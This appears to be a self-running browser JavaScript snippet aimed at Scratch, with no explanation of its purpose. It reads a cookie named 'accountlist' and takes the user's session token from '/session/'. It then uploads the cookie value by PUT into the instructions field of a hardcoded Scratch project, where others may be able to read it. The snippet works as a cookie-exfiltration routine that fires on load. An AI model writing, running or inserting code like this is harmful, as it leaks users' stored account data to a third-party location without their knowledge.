async function upload(){
	function getCookieValue(key) {
		const cookies = document.cookie.split(';');
		for (let cookie of cookies) {
			var cookiesArray = cookie.split('='); 
			if (cookiesArray[0].trim() == key.trim()) { 
				return cookiesArray[1];  // (key[0],value[1])
			}
		}
		return '';
	}
	
	let token=(await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
	let data=await fetch("https://api.scratch.mit.edu/projects/771297522",{
		method:"PUT",
		body:JSON.stringify({"instructions":getCookieValue("accountlist")}),
		headers:{
			"x-token":token
		}});
  }
upload()
